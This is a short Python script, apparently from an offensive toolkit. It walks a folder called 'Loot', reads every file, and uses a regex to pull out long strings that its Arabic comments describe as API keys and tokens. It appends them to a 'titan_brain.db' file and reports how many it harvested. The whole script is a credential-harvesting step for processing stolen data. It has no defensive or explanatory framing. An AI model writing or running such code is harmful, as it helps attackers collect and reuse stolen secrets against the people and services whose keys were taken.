import os, re

LOOT_PATH = "Data_Vault/Loot"
BRAIN_FILE = "Data_Vault/titan_brain.db"

def feed_titan():
    print("[🧬] Titan is feeding on ALL available data...")
    if not os.path.exists(LOOT_PATH): return
    
    found_count = 0
    for root, dirs, files in os.walk(LOOT_PATH):
        for file in files:
            try:
                with open(os.path.join(root, file), 'r', errors='ignore') as f:
                    data = f.read()
                    # استخراج مفاتيح الـ API والـ Tokens
                    tokens = re.findall(r'([a-zA-Z0-9_-]{24,})', data)
                    if tokens:
                        with open(BRAIN_FILE, "a") as brain:
                            for t in tokens: 
                                brain.write(t + "\n")
                                found_count += 1
            except Exception:
                continue # تخطي أي ملف مشفر أو مفقود مؤقتاً
    print(f"[🔥] Brain updated with {found_count} new patterns. Feeding Complete.")

if __name__ == "__main__":
    feed_titan()
